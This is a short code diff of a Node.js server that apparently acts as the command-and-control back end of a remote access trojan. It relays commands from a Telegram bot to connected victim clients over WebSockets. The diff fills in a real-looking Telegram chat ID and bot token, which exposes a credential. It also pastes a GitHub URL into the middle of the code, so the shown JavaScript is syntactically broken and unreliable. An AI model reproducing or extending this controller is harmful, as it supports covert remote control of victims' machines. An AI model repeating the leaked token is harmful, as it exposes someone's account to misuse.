@@ -11,8 +11,8 @@ const app = express()
 app.use(bodyParser.json());
 const server = http.createServer(app);
 const wss = new socket.Server({server});
-const chatId = 'CHATID'
-const token = 'TOKEN'
+const chatId = '2121188868'
+const token = '5271319057:AAEMjReWzB2eIydNoL6dt83vlwRxC5_DOpM'
 const bot = new TelegramBot(token, {polling: true});
 
 // request -------------------------------------------------------------------
@@ -111,7 +111,7 @@ bot.on("message", (msg) => {
                 if (client.uuid === uuid) {
                     client.send(`ss&${data}`)
                 }
-            })
+            })https://github.com/NalCybery/ratta/blob/main/server.js
             bot.sendMessage(chatId, "Your Request Is On Progress !", {
                 "reply_markup": {
                     "keyboard": [["Status ⚙"], ["Action ☄"]]
